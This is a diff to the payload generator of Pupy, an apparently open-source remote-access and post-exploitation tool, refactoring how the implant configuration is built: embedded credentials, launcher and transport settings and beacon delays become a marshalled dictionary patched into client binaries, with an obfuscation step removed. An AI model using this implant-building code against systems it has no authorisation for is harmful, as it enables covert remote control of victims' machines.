@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the
+# root of the project for the detailed licence terms
 
 import argparse
 import sys
@@ -20,7 +22,6 @@ if __name__ == '__main__':
     sys.path.insert(0, os.path.join(ROOT, 'pupy', 'library_patches'))
 
 import marshal
-import cPickle
 import base64
 import os
 import pylzma
@@ -34,9 +35,7 @@ from pupylib.payloads import dependencies
 from pupylib.payloads.dotnet import dotnet_serve_payload, DotNetPayload
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
-from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.PupyConfig import PupyConfig
-from pupylib.PupyCompile import pupycompile
 from pupylib.PupyLogger import getLogger
 from pupylib.PupyOutput import Success, Warn, Error, List, Table, MultiPart, Color
 from network.conf import transports, launchers
@@ -49,7 +48,7 @@ from pupylib.PupyCredentials import Credentials, EncryptionError
 
 logger = getLogger('gen')
 
-HARDCODED_CONF_SIZE= 65536
+HARDCODED_CONF_SIZE = 262144
 
 class NoOutput(Exception):
     pass
@@ -73,7 +72,12 @@ def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
     elif len(offsets) > 1:
         raise Exception("Error: multiple offsets to edit the config have been found")
 
-    new_conf = marshal.dumps(compile(get_raw_conf(display, conf), '<config>', 'exec'))
+    config = get_raw_conf(display, conf)
+    pupylib = dependencies.importer((
+        'network', 'pupy'
+    ), path=ROOT, as_dict=True)
+
+    new_conf = marshal.dumps([config, pupylib])
     uncompressed = len(new_conf)
     if compressed_config:
         new_conf = pylzma.compress(new_conf)
@@ -95,14 +99,14 @@ def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
     return binary
 
-def get_raw_conf(display, conf, obfuscate=False, verbose=False):
+def get_raw_conf(display, conf, verbose=False):
 
     credentials = Credentials(role='client')
 
-    if "offline_script" not in conf:
-        offline_script=""
+    if 'offline_script' not in conf:
+        offline_script = ''
     else:
-        offline_script=conf["offline_script"]
+        offline_script = conf['offline_script']
 
     launcher = launchers[conf['launcher']]()
     launcher.parse_args(conf['launcher_args'])
@@ -110,7 +114,7 @@ def get_raw_conf(display, conf, obfuscate=False, verbose=False):
     required_credentials = set(launcher.credentials) \
       if hasattr(launcher, 'credentials') else set([])
 
-    transport = launcher.get_transport()
+    transport = launcher.transport
     transports_list = []
 
     if transport:
@@ -118,6 +122,7 @@ def get_raw_conf(display, conf, obfuscate=False, verbose=False):
         if transports[transport].credentials:
             for name in transports[transport].credentials:
                 required_credentials.add(name)
+
     elif not transport:
         for n, t in transports.iteritems():
             transports_list.append(n)
@@ -144,10 +149,10 @@ def get_raw_conf(display, conf, obfuscate=False, verbose=False):
             List(not_available, bullet=Color('-', 'red'),
             caption=Error('Required credentials (not found)')))
 
-    embedded_credentials = '\n'.join([
-        '{}={}'.format(credential, repr(credentials[credential])) \
+    embedded_credentials = {
+        credential: credentials[credential]
         for credential in required_credentials if credentials[credential] is not None
-    ])+'\n'
+    }
 
     if verbose:
         config_table = [{
@@ -158,29 +163,19 @@ def get_raw_conf(display, conf, obfuscate=False, verbose=False):
 
         display(Table(config_table, ['KEY', 'VALUE'], Color('Configuration', 'yellow'), vspace=1))
 
-    config = '\n'.join([
-        'pupyimporter.pupy_add_package({})'.format(
-            repr(cPickle.dumps({
-                'pupy_credentials.pye':
-                bytes(pupycompile(embedded_credentials, obfuscate=True))
-            }))),
-        dependencies.importer(set(
-            'network.transports.{}'.format(transport) for transport in transports_list
-        ), path=ROOT),
-        'import sys',
-        'sys.modules.pop("network.conf", "")',
-        'import network.conf',
-        'LAUNCHER={}'.format(repr(conf['launcher'])),
-        'LAUNCHER_ARGS={}'.format(repr(conf['launcher_args'])),
-        'CONFIGURATION_CID={}'.format(conf.get('cid', 0x31338)),
-        'DELAYS={}'.format(repr(conf.get('delays', [
-            (10, 5, 10), (50, 30, 50), (-1, 150, 300)]))),
-        'pupy.cid = CONFIGURATION_CID',
-        'debug={}'.format(bool(conf.get('debug', False))),
-        'SCRIPTLETS={}'.format(repr(offline_script) if offline_script else '""')
-    ])
+    config = {
+        'credentials': embedded_credentials,
+        'scriptlets': [offline_script] or [],
+        'debug': conf.get('debug', False),
+        'launcher': conf['launcher'],
+        'launcher_args': conf['launcher_args'],
+        'cid': conf.get('cid', 0x31338),
+        'delays': conf.get('delays', [
+            (10, 5, 10), (50, 30, 50), (-1, 150, 300)
+        ])
+    }
 
-    return compress_encode_obfs(config) if obfuscate else config
+    return config
 
 def updateZip(zipname, filename, data):
     # generate a temp file
@@ -643,7 +638,7 @@ def pupygen(args, config, pupsrv, display):
         'launcher_args': args.launcher_args,
         'offline_script': script_code,
         'debug': args.debug,
-        'cid': hex(random.SystemRandom().getrandbits(32))
+        'cid': random.SystemRandom().getrandbits(32)
     }
 
     if args.delays_list:
